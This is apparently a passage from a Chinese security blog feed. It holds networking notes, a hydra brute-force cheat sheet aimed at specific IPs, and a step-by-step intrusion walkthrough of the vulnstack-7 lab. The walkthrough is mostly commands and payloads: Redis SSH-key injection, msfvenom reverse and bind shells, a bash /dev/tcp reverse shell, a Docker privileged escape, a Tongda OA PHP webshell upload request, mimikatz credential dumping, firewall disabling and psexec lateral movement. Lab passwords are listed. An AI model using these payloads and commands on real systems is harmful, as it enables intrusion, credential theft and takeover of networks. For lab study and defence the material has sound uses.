    <content type="html"><![CDATA[<h1>访问域名全流程</h1><p><a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90&amp;spm=1001.2101.3001.7020">域名解析</a> --&gt; 发起TCP的3次握手 --&gt; 建立TCP连接后发起http请求 --&gt;  服务器响应http请求，浏览器得到html代码 --&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等）  --&gt; 浏览器对页面进行渲染呈现给用户</p><ol><li>DNS解析</li><li>发起TCP请求</li><li>发起HTTP请求</li><li>负载均衡</li><li>浏览器渲染</li><li>网页静态资源加载</li></ol><h3 id="DNS解析（UDP）"><a class="header-anchor" href="#DNS解析（UDP）">¶</a>DNS解析（UDP）</h3><p>访问目标地址有两种方式：</p><p>①使用目标IP地址访问。由于IP地址是一堆数字不方便记忆，于是有了域名这种<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E5%9E%8B&amp;spm=1001.2101.3001.7020">字符型</a>标识。</p><p>②使用域名访问。域名解析就是域名到IP地址的转换过程，域名的解析工作由DNS服务器完成。</p><p>DNS域名解析时用的是UDP协议。整个域名解析的过程如下：</p><ol><li>浏览器向本机DNS模块发出DNS请求，DNS模块生成相关的DNS报文；</li><li>DNS模块将生成的DNS报文传递给传输层的UDP协议单元；</li><li>UDP协议单元将该数据封装成UDP数据报，传递给网络层的IP协议单元；</li><li>IP协议单元将该数据封装成IP数据包，其目的IP地址为DNS服务器的IP地址；</li><li>封装好的IP数据包将传递给数据链路层的协议单元进行发送；</li><li>发送时在ARP缓存中查询相关数据，如果没有，就发送ARP广播（包含待查询的IP地址，收到广播的主机检查自己的IP，符合条件的主机将含有自己MAC地址的ARP包发送给ARP广播的主机）请求，等待ARP回应；</li><li>得到ARP回应后，将IP地址与路由的下一跳MAC地址对应的信息写入ARP缓存表；</li><li>写入缓存后，以路由下一跳的地址填充目的MAC地址，以数据帧形式转发；</li><li>转发可能进行多次；</li><li>DNS请求到达DNS服务器的数据链路层协议单元；</li><li>DNS服务器的数据链路层协议单元解析数据帧，将内部的IP数据包传递给网络层IP协议单元；</li><li>DNS服务器的IP协议单元解析IP数据包，将内部的UDP数据报传递给传输层UDP协议单元；</li><li>DNS服务器的UDP协议单元解析收到的UDP数据报，将内部的DNS报文传递给DNS服务单元；</li><li>DNS服务单元将域名解析成对应IP地址，产生DNS回应报文；</li><li>DNS回应报文-&gt;UDP-&gt;IP-&gt;MAC-&gt;我的主机；</li><li>我的主机收到数据帧，将数据帧-&gt;IP-&gt;UDP-&gt;浏览器；</li><li>将域名解析结果以域名和IP地址对应的形式写入DNS缓存表。</li></ol><h3 id="发起TCP请求（三次握手）结束（四次挥手）"><a class="header-anchor" href="#发起TCP请求（三次握手）结束（四次挥手）">¶</a>发起TCP请求（三次握手）结束（四次挥手）</h3><p>第一次握手：客户端向服务端发送了一个同步报文段</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">SYN</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>：表示客户端请求连接<br></code></pre></td></tr></table></figure><p>第二次握手：服务端收到了用户端的请求，同意建立连接，然后服务器发送确认报文段给客户端</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SYN</span>=1 <span class="hljs-attribute">ACK</span>=1：表示同意建立连接<br></code></pre></td></tr></table></figure><p>第三次握手：客户端收到了服务端同意连接的确认之后，开始发送第一个数据包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ACK：表示收到服务器的确认数据包 <br></code></pre></td></tr></table></figure><p>（所有TCP报文通过IP（DNS）-&gt;MAC（ARP）-&gt;网关-&gt;目的主机/我的主机；）</p><p>第一次挥手：客户端向服务端发送连接释放的请求报文，并且停止发送数据</p><pre><code class="hljs">    FIN=1：客户端主动释放客户端到服务端的TCP连接</code></pre><p>第二次挥手：服务端收到了客户端的请求释放报文，给客户端发送确认报文。从客户端到服务端这个方向上的连接就释放了，TCP连接处于半关闭状态。此时客户端无法发送数据给服务端，但是服务端还可以发送数据给客户端，客户端仍可以接收。</p><pre><code class="hljs">    ACK=1：表示同意客户端释放连接请求</code></pre><p>第三次挥手：服务端没有数据再发给客户端数据，其应用进程就通知TCP释放连接，并向客户端发送确认报文</p><pre><code class="hljs">    FIN=1 ACK=1：表示服务器释放服务器到客户端的TCP连接</code></pre><p>第四次挥手：客户端收到服务端的释放报文段后，给服务端发送同意确认报文</p><h3 id="发起HTTP请求"><a class="header-anchor" href="#发起HTTP请求">¶</a>发起HTTP请求</h3><ol><li>浏览器向域名发出GET方法报文（HTTP请求）；</li><li>该GET方法报文通过TCP-&gt;IP（DNS）-&gt;MAC（ARP）-&gt;网关-&gt;目的主机；</li><li>目的主机收到数据帧，通过IP-&gt;TCP-&gt;HTTP，HTTP协议单元会回应HTTP协议格式封装好的HTML形式数据（HTTP响应）；[<br>从请求信息中获得客户机想访问的主机名。从请求信息中获取客户机想要访问的web应用（web应用程序指提供浏览器访问的程序，简称web应用）。从请求信息中获取客户机要访问的web资源。（web资源，即各种文件，图片，视频，文本等）读取相应的主机下的web应用，web资源。用读取到的web资源数据，创建一个HTTP响应。]</li><li>该HTML数据通过TCP-&gt;IP（DNS）-&gt;MAC（ARP）-&gt;网关-&gt;我的主机；</li><li>我的主机收到数据帧，通过IP-&gt;TCP-&gt;HTTP-&gt;浏览器，浏览器以网页形式显示HTML内容.</li></ol><h3 id="负载均衡"><a class="header-anchor" href="#负载均衡">¶</a>负载均衡</h3><p>（1）如果我们的平台配备了负载均衡的话，前一步DNS解析获得的IP地址应该是我们Nginx负载均衡服务器的IP地址。所以，我们的浏览器将我们的网页请求发送到了Nginx负载均衡服务器上。<br>（2）Nginx根据我们设定的分配算法和规则，选择一台后端的真实Web服务器，与之建立TCP连接、并转发我们浏览器发出去的网页请求。<br>（3）Web服务器收到请求，产生响应，并将网页发送给Nginx负载均衡服务器。<br>（4）Nginx负载均衡服务器将网页传递给filters链处理，之后发回给我们的浏览器.</p><h3 id="浏览器渲染"><a class="header-anchor" href="#浏览器渲染">¶</a>浏览器渲染</h3><p>（1）浏览器根据页面内容，生成DOM Tree。根据CSS内容，生成CSS Rule Tree(规则树)。调用JS执行引擎执行JS代码。<br>（2）根据DOM Tree和CSS Rule Tree生成Render Tree(呈现树)。<br>（3）根据Render Tree渲染网页。<br>在浏览器解析页面内容的时候，发现页面引用了其他未加载的image、css文件、js文件等静态内容，因此开始了第二部分。</p><h3 id="网页静态资源加载"><a class="header-anchor" href="#网页静态资源加载">¶</a>网页静态资源加载</h3>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hydra的基本使用</title>
    <link href="/posts/e3c3c3a8.html"/>
    <url>/posts/e3c3c3a8.html</url>
    
    <content type="html"><![CDATA[<p>-R：继续从上一次进度接着破解</p><p>-S：大写，采用 SSL 链接 https爆破</p><p>-s：小写，可通过这个参数指定非默认端口</p><p>-l：指定破解的用户，对特定用户破解</p><p>-L：指定用户名字典</p><p>-p：小写，指定密码破解，少用，一般是采用密码字典</p><p>-P：大写，指定密码字典</p><p>-e：可选选项，n：空密码试探，s：使用指定用户和密码试探</p><p>-C：使用冒号分割格式，例如「登录名:密码」来代替 -L/-P 参数</p><p>-M：指定目标列表文件一行一条</p><p>-o：指定结果输出文件</p><p>-f：在使用 -M 参数以后，找到第一对登录名或者密码的时候中止破解</p><p>-t：同时运行的线程数，默认为 16</p><p>-w：设置最大超时的时间，单位秒，默认是 30s</p><p>-v / -V：显示详细过程</p><p>-f：一但爆破成功一个就停止爆破server：目标 IP</p><p>service：指定服务名/协议</p><p>option：可选项</p><p>破解FTPhydra -L 用户字典 -P 密码字典  -vV 192.168.10.1 ftp</p><p>破解SSHhydra -l root -P 密码字典 -vV 1.15.136.212 ssh</p><p>爆破MySQL hydra -l root -P 密码字典 -vV 1.15.136.212 mysql</p><p>破解rdphydra ip -l administrator -P 密码字典 -vV 1.15.136.212 rdp</p><p>破解smb</p><p>hydra -l administrator -P 密码字典 ip smb</p><p>破解telnet hydra ip telnet -l username -P 密码字典 -t 32 -s 23 -e ns -f -V</p><p>爆破vnchydra -p Root123! -vV vnc://123.59.xxx.xxx:5901</p><p>破解HTTPS hydra -m /index.php -l username -P pass.txt IP https</p><p>破解POP3hydra -l muts -P pass.txt my.pop3.mail pop3</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日内网靶场vulnstack-7</title>
    <link href="/posts/f656209c.html"/>
    <url>/posts/f656209c.html</url>
    
    <content type="html"><![CDATA[<h1>前言：</h1><p><strong>此靶场复现过程来自某位备受靶场环境折磨的友人……</strong>😬😬😬</p><h1><em><strong>*配置*</strong></em></h1><img src="/posts/f656209c/wps1.jpg" class title="img"> <p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为 10.10.10.0/24；VMnet14设为仅主机模式，IP段设为192.168.93.0/24</p><img src="/posts/f656209c/wps2.jpg" class title="img"> <p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机 皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</p><p>DMZ区域：</p><p>给Ubuntu (Web 1) 配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二 层网络。</p><p>第二层网络区域：</p><p>给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网 络，一个连接在VMnet14上连通第三层网络。</p><p>第三次网络区域：</p><p>给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第 三层网络。</p><h4 id="服务配置"><a class="header-anchor" href="#服务配置">¶</a><em><strong>*服务配置*</strong></em></h4><p>靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应 的主机上启动靶机服务：</p><p>DMZ区的 Ubuntu 需要启动nginx服务：</p><p>sudo su<br>redis-server /etc/redis.conf<br>/usr/sbin/nginx -c /etc/nginx/nginx.conf<br>iptables -F  /关闭防火墙</p><p><img src="/posts/f656209c/wps3.jpg" alt="img"><img src="/posts/f656209c/wps4.jpg" alt="img"></p><p>第二层网络的 Ubuntu需要启动docker容器：</p><p>sudo service docker start<br>sudo docker start 8e172820ac78</p><img src="/posts/f656209c/wps5.jpg" class title="img"> <p>第三层网络的 Windows 7 （PC 1）需要启动通达OA：</p><p>C:\MYOA\bin\AutoConfig.exe</p><img src="/posts/f656209c/wps6.jpg" class title="img"> <h4 id="域用户信息"><a class="header-anchor" href="#域用户信息">¶</a><em><strong>*域用户信息*</strong></em></h4><p>域用户账户和密码如下：</p><p>Administrator：Whoami2021<br>whoami：Whoami2021<br>bunny：Bunny2021<br>moretz：Moretz2021</p><p>Ubuntu 1：</p><p>web：web2021</p><p>Ubuntu 2：</p><p>ubuntu：ubuntu</p><p>通达OA账户：</p><p>admin：admin657260</p><h4 id="ip信息"><a class="header-anchor" href="#ip信息">¶</a><em><strong>*ip信息*</strong></em></h4><p>kali<br>192.168.3.239<br>web1<br>192.168.3.156<br>192.168.52.10<br>web2<br>192.168.52.20<br>192.168.93.10<br>pc1<br>192.168.52.30<br>192.168.93.20<br>pc2<br>192.168.93.40<br>dc<br>192.168.93.30</p><h1><em><strong>*外网打点*</strong></em></h1><h4 id="主机探测"><a class="header-anchor" href="#主机探测">¶</a><em><strong>*主机探测*</strong></em></h4><p>用nmap或者arp都可以，本人测试arp快一点</p><p>nmap -sn 192.168.3.0/24<br>arp-scan -l</p><img src="/posts/f656209c/wps7.jpg" class title="img"> <p>接下来利用nmap扫描开放端口，开放22，80，81，6379端口</p><p>nmap -n -v -sS --min-rate 10000 -p- -Pn 192.168.3.162</p><img src="/posts/f656209c/wps8.jpg" class title="img"> <p>访问一下80和81端口</p><p><img src="/posts/f656209c/wps9.jpg" alt="img"><img src="/posts/f656209c/wps10.jpg" alt="img"></p><h4 id="redis未授权访问"><a class="header-anchor" href="#redis未授权访问">¶</a><em><strong>*redis未授权访问*</strong></em></h4><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><p>redis-cli -h 192.168.3.156</p><p>直接连上，输入info可以看到直接执行</p><img src="/posts/f656209c/wps11.jpg" class title="img"> <h4 id="本地生成密钥然后覆盖目标主机的密钥"><a class="header-anchor" href="#本地生成密钥然后覆盖目标主机的密钥">¶</a><em><strong>*本地生成密钥然后覆盖目标主机的密钥*</strong></em></h4><p>攻击者在未授权访问redis的情况下，利用redis自身提供的config命令，可以进行写文件的操作，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件夹的authotrized_keys文件中，进而可以使用对于私钥直接使用ssh服务登录目标服务器</p><p>ssh-keygen -t rsa  #生成公钥<br>(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; 1.txt  #将公钥导入1.txt文件<br>cat 1.txt | redis-cli -h 192.168.3.156 -p 6379 -x set hello  #把1.txt文件内容写入目标主机的redis缓冲中<br>config set dir /root/.ssh         #设置redis的备份路径为/root/.ssh/<br>config set dbfilename authorized_keys   #设置保存文件名为authorized_keys<br>save                   #将数据保存在目标服务器硬盘上<br>ssh <a href="mailto:root@192.168.3.156">root@192.168.3.156</a>            #连接</p><p><img src="/posts/f656209c/wps12.jpg" alt="img"><img src="/posts/f656209c/wps13.jpg" alt="img"><img src="/posts/f656209c/wps14.jpg" alt="img"><img src="/posts/f656209c/wps15.jpg" alt="img"></p><img src="/posts/f656209c/wps16.jpg" class title="img"> <p>切换到家目录，查看</p><p><img src="/posts/f656209c/wps17.jpg" alt="img"><img src="/posts/f656209c/wps18.jpg" alt="img"></p><h4 id="上线msf"><a class="header-anchor" href="#上线msf">¶</a><em><strong>*上线msf*</strong></em></h4><p>生成马子，利用拿到的ssh从网络上下载到ubuntu</p><p>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.239 LPORT=6666 -f elf &gt; ubuntu.elf</p><p>msf，启动！</p><p>msfconsole<br>use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.3.239<br>set lport 6666<br>run</p><p>chmod +x ubuntu.elf<br>./ubuntu.elf</p><img src="/posts/f656209c/wps19.jpg" class title="img"> <img src="/posts/f656209c/wps20.jpg" class title="img"> <p>成功上线Ubuntu web1</p><img src="/posts/f656209c/wps21.jpg" class title="img"> <h4 id="添加路由"><a class="header-anchor" href="#添加路由">¶</a><em><strong>*添加路由*</strong></em></h4><p>run get_local_subnets<br>run post/multi/manage/autoroute<br>run autoroute -p</p><img src="/posts/f656209c/wps22.jpg" class title="img"> <img src="/posts/f656209c/wps23.jpg" class title="img"> <h4 id="Laravel-Debug-RCE（CVE-2021-3129）"><a class="header-anchor" href="#Laravel-Debug-RCE（CVE-2021-3129）">¶</a><em><strong>*Laravel Debug RCE（CVE-2021-3129）*</strong></em></h4><p>81端口是个laravel版本在右下角写着，为8.29.0，存在远程命令执行漏洞Laravel Debug RCE（CVE-2021-3129）</p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。这里直接使用工具 getshell，工具下载地址：</p><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p><p>可以写入哥斯拉的webshell（要使用低版本的哥斯拉，因为高版本的哥斯拉生成的马的加密方式已经改变了导致会连接失败）</p><img src="/posts/f656209c/wps24.jpg" class title="img"> <h4 id="linux环境变量提权"><a class="header-anchor" href="#linux环境变量提权">¶</a><em><strong>*linux环境变量提权*</strong></em></h4><p>PATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。</p><p>参考：<a href="https://www.freebuf.com/articles/system/173903.html">https://www.freebuf.com/articles/system/173903.html</a></p><p><a href="https://blog.csdn.net/weixin_49340699/article/details/118801756">https://blog.csdn.net/weixin_49340699/article/details/118801756</a></p><p>当前用户为 www-data，枚举具有SUID权限的所有二进制文件，发现 /home/jobs/shell</p><p>find / -perm -u=s -type f 2&gt;/dev/null #\</p><img src="/posts/f656209c/wps25.jpg" class title="img"> <p>看到/home/jobs下有个shell，打算切换目录，但是无法执行，离谱，然后又在网站根目录上传了一个蚁剑的然后切换到那个目录</p><p>find / -perm -u=s -type f 2&gt;/dev/null #<br>./shell<br>cp /bin/bash /tmp/ps<br>ls /tmp<br>echo $PATH<br>export PATH=/tmp:$PATH #将/tmp添加到环境变量中，并且先加载执行/tmp里的程序<br>这里由于是docker环境，需要先把shell反弹到ubuntu1再执行操作<br>nc -lvp 1234<br>webshell：bash -c ‘exec bash -i &gt;&amp; /dev/tcp/192.168.52.10/1234 0&gt;&amp;1’<br>更改$PATH来执行恶意程序，从而获得目标主机的 root 权限 shell</p><p><img src="/posts/f656209c/wps27.jpg" alt="img"><img src="/posts/f656209c/wps28.jpg" alt="img"></p><h4 id="docker特权模式逃逸"><a class="header-anchor" href="#docker特权模式逃逸">¶</a><em><strong>*docker特权模式逃逸*</strong></em></h4><p>特权模式于版本 0.6 时被引入 docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 docker run —privileged 时，docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令</p><p>把 Laravel 的高权限 shell（192.168.52.20）再反弹到 ubuntu 18（192.168.52.10）中</p><p>判断是否为docker 环境<br>1、使用下面命令，查看是否存在 dockerrnv 文件<br>ls -alh /.dockerenv</p><p>2、查看系统进程的cgroup信息<br>cat /proc/1/cgroup</p><img src="/posts/f656209c/wps29.jpg" class title="img"> <p>fdisk -l   #查看磁盘文件<br>ls /dev    #查看设备文件<br>cd /<br>mkdir hello<br>mount /dev/sda1 /hello<br>ls /hello</p><img src="/posts/f656209c/wps30.jpg" class title="img"> <img src="/posts/f656209c/wps31.jpg" class title="img"> <p>ssh-keygen -f hello<br>chmod 600 hello #赋予权限</p><img src="/posts/f656209c/wps32.jpg" class title="img"> <p>覆盖密匙：<br>cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys  #-avx将权限也一起复制<br>echo &gt; /hello/home/ubuntu/.ssh/authorized_keys 　　　　　　              #清空authorized_keys文件<br>echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hzizjmrEOuglTCmszsmOkJ1DowNdw20+z9hhSdpq6pl6Bpohp3f5V7WsdB09/blF8S+yWFSLDtdeDN4zQH6bKXyKOUBvBnxku+3v+xaNX5gTDj4mU9wEzrmiHNyDbKbpAbs8K7o85aOXxXzP0hMzpgI9zuB0kNDzj/p+IAmnQHC9PqR6YGSl1QoI3pIHWjXVk1aRuTN2bOBpCkF0OtgMBg8mNpPNoGnhKBq7zCMbIa6smhw71V6vnCxnmvhJQK6Ug72VWDK9uUIKX052adUnLqGBcF/2XqRLMGY4Hoe5iMT/Px1xErmC+q4/vfhCHdXpe8kmBr9aPoNJuVjVnpfZ root@ubuntu’ &gt; /hello/home/ubuntu/.ssh/authorized_keys    #将ssh秘钥写入authorized_keys文件<br>cat /hello/home/ubuntu/.ssh/authorized_keys  #查看是否写入成功<br>ssh -i hello <a href="mailto:ubuntu@192.168.52.20">ubuntu@192.168.52.20</a> #指定本地密钥登录</p><p><img src="/posts/f656209c/wps33.jpg" alt="img"><img src="/posts/f656209c/wps34.jpg" alt="img"></p><h1><em><strong>*上线Ubuntu web2*</strong></em></h1><p>生成马子（低权限，现在最好不上线，一会提权完成在上线，但是不知道为什么我上线完之后两个session都莫名其妙死掉了，又重新上线了一遍）</p><p>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7777 -f elf -o ubuntu2.elf</p><p>上传shell</p><img src="/posts/f656209c/wps35.jpg" class title="img"> <p>上传成功</p><img src="/posts/f656209c/wps36.jpg" class title="img"> <p>开启http服务</p><img src="/posts/f656209c/wps37.jpg" class title="img"> <p>Ubuntu2wget下载<img src="/posts/f656209c/wps38.jpg" class title="img"></p><p>开启监听</p><p>use exploit/multi/handler<br>set payload linux/x64/meterpreter/bind_tcp<br>set rhost 192.168.52.20<br>set lport 7777<br>run</p><img src="/posts/f656209c/wps39.jpg" class title="img"> <h4 id="CVE-2021-3493-提权"><a class="header-anchor" href="#CVE-2021-3493-提权">¶</a><em><strong>*CVE-2021-3493*</strong></em><em><strong>*提权*</strong></em></h4><p>当前登录用户是 ubuntu，查看系统信息，发现服务器在 cve-2021-3493 内核提权漏洞影响版本内</p><p>漏洞原理：Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权</p><img src="/posts/f656209c/wps40.jpg" class title="img"> <p>提权工具：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p><p>这里就直接在目录下touch一个文件，然后把脚本内容写进去，或者输入重定向echo 脚本内容 &gt; 1.txt，然后执行编译，执行得到的文件，我们就获得了root权限，</p><p>gcc exploit.c -o exploit<br>chmod +x exploit<br>./exploit</p><h4 id="二上msf"><a class="header-anchor" href="#二上msf">¶</a><em><strong>*二上msf*</strong></em></h4><p>操作和第一次一样，生成马子，upload上传，wget下载，加权限，执行，kali这边设置模块，run，添加路由，直接上截图<img src="/posts/f656209c/wps41.jpg" alt="img"><img src="/posts/f656209c/wps42.jpg" alt="img"><img src="/posts/f656209c/wps43.jpg" alt="img"></p><h1><em><strong>*上线pc1*</strong></em></h1><p>添加路由之后发现存在192.168.52.0网段的路由，于是搭建frp代理</p><p>kali启动服务端<br>[common]<br>bind_port = 9100<br>ubuntu1启动客户端<br>#frpc.ini<br>[common]<br>server_addr = 192.168.3.239<br>server_port = 9100</p><p>[plugin_socks]<br>type = tcp<br>remote_port = 9101<br>plugin = socks5</p><h4 id="扫描端口"><a class="header-anchor" href="#扫描端口">¶</a><em><strong>*扫描端口*</strong></em></h4><p>接着，我们使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：</p><p>use auxiliary/scanner/discovery/udp_probe<br>set rhosts 192.168.52.1-255<br>set threads 5<br>run</p><img src="/posts/f656209c/wps44.jpg" class title="img"> <p>对192.168.52.30进行识别</p><p>nmap -sV 192.168.52.30</p><img src="/posts/f656209c/wps45.jpg" class title="img"> <p>访问80端口发现是一个通达oa页面（使用socks5代理访问）存在漏洞，手工复现一波，抓包</p><p>POST /ispirit/im/upload.php HTTP/1.1<br>Host: 192.168.52.30:8080<br>Content-Length: 658<br>Cache-Control: no-cache<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br>Accept: <em>/</em><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5<br>Cookie: PHPSESSID=123<br>Connection: close</p><p>------WebKitFormBoundarypyfBh1YB4pV8McGB<br>Content-Disposition: form-data; name=“UPLOAD_MODE”</p><p>2<br>------WebKitFormBoundarypyfBh1YB4pV8McGB<br>Content-Disposition: form-data; name=“P”</p><p>123<br>------WebKitFormBoundarypyfBh1YB4pV8McGB<br>Content-Disposition: form-data; name=“DEST_UID”</p><p>1<br>------WebKitFormBoundarypyfBh1YB4pV8McGB<br>Content-Disposition: form-data; name=“ATTACHMENT”; filename=“jpg”<br>Content-Type: image/jpeg</p><?php$command=$_POST['cmd'];$wsh = new COM('WScript.shell');$exec = $wsh->exec("cmd /c ".$command);$stdout = $exec->StdOut();$stroutput = $stdout->ReadAll();echo $stroutput;?><p>------WebKitFormBoundarypyfBh1YB4pV8McGB–</p><img src="/posts/f656209c/wps46.jpg" class title="img"> <p>POST /ispirit/interface/gateway.php HTTP/1.1<br>Host: 192.168.52.30:8080<br>Connection: keep-alive<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>User-Agent: python-requests/2.21.0<br>Content-Length: 70<br>Content-Type: application/x-www-form-urlencoded</p><p>json={“url”:“/general/…/…/attach/im/2309/531433566.jpg”}&amp;cmd=whoami</p><img src="/posts/f656209c/wps47.jpg" class title="img"> <p>OK，直接上工具，代理改一下直接检测，上传马子</p><img src="/posts/f656209c/wps48.jpg" class title="img"> <p>蚁剑连接<img src="/posts/f656209c/wps49.jpg" class title="img"></p><p>上传一个msf的exe，上线之后添加路由</p><p>msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.93.20 LPORT=4444 -f exe &gt; msf.exe<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set lport 4302<br>set rhost 192.168.93.20<br>run</p><img src="/posts/f656209c/wps50.jpg" class title="img"> <p>然后扫描一下93网段存活的主机（我这里设置的范围比较小，怕扫着扫着会话死掉，或者靶机崩了，已经重做很多次），40的机器很明显是域控<img src="/posts/f656209c/wps51.jpg" class title="img"></p><p>扫一下永恒之蓝，尝试了一下域控没上线<img src="/posts/f656209c/wps52.jpg" class title="img"></p><p>回到pc1的会话，收集一下基本信息，然后查看账户密码</p><p>load kiwi<br>migrate 进程（ps查看，迁移到64位的system权限的）<br>kiwi_cmd privilege::debug<br>kiwi_cmd sekurlsa::logonpasswords</p><p><img src="/posts/f656209c/wps53.jpg" alt="img"><img src="/posts/f656209c/wps54.jpg" alt="img"><img src="/posts/f656209c/wps55.jpg" alt="img"></p><h1><em><strong>*上线DC*</strong></em></h1><p>得到了域控的账号密码，关掉防火墙之后用模块上线</p><p>shell<br>net use \192.168.93.30\ipc$ “Whoami2021” /user:“Administrator”<br>sc \192.168.93.30 create unablefirewall binpath= “netsh advfirewall set allprofiles state off”<br>sc \192.168.93.30 start unablefirewall</p><img src="/posts/f656209c/wps56.jpg" class title="img"> <p>use exploit/windows/smb/psexec<br>set payload windows/meterpreter/bind_tcp<br>set rhost 192.168.93.30<br>set smbuser administrator<br>set smbpass Whoami2021</p><p><img src="/posts/f656209c/wps57.jpg" alt="img"><img src="/posts/f656209c/wps58.jpg" alt="img"></p><h1><em><strong>*上线pc2*</strong></em></h1><p>很多方法，第一种用永恒之蓝打，但是很难打出来，而且很容易死会话，而且是一死全死那种<img src="/posts/f656209c/wps59.jpg" class title="img"></p><p>第二种就是和上线DC一样的方法，利用模块，但是我的靶机不对劲，登录上去<img src="/posts/f656209c/wps60.jpg" class title="img"></p><p>第三种是将msf的session派发给cs利用cs上线<img src="/posts/f656209c/wps61.jpg" class title="img"></p><p>至此拿下全部机器，在贴一张msf的sessions图</p><img src="/posts/f656209c/wps62.jpg" class title="img"> <p>🌄🌄🌄🌄🌄🌄🌇🌇🌇🌇🌇🌇🌇</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xray的基本使用</title>
    <link href="/posts/8487c21c.html"/>
    <url>/posts/8487c21c.html</url>
    
    <content type="html"><![CDATA[<h2 id="配置："><a class="header-anchor" href="#配置：">¶</a>配置：</h2><p>Xray的配置相对来说比较友好，没有那么痛苦</p><p>使用<code>--config</code> 用于指定配置文件的位置，默认加载同目录的 config.yaml。</p><p>–h 查看帮助</p><h2 id="命令："><a class="header-anchor" href="#命令：">¶</a>命令：</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>webscan</td><td>xray核心功能，用来发现探测Web漏洞</td></tr><tr><td>servicescan</td><td>服务扫描功能 用来探测服务漏洞</td></tr><tr><td>poclint</td><td>检测poc是否符合规范</td></tr><tr><td>reverse</td><td>启动单独的盲打平台服务</td></tr><tr><td>genca</td><td>用于快速生成一个根证书，主要用于被动代理扫描HTTPS流量时用到</td></tr><tr><td>upgrade</td><td>检查新版本并自动升级</td></tr><tr><td>version</td><td>版本信息</td></tr><tr><td>help</td><td>显示命令列表或一个命令的帮助</td></tr><tr><td>subdomain</td><td>子域名扫描 高级本才有的命令</td></tr></tbody></table><h3 id="生成ca证书"><a class="header-anchor" href="#生成ca证书">¶</a>生成ca证书</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.\xray.exe <span class="hljs-keyword">ge</span><span class="hljs-symbol">nca</span><br></code></pre></td></tr></table></figure><p>会生成ca.key，ca.crt两个文件</p><h3 id="webscan"><a class="header-anchor" 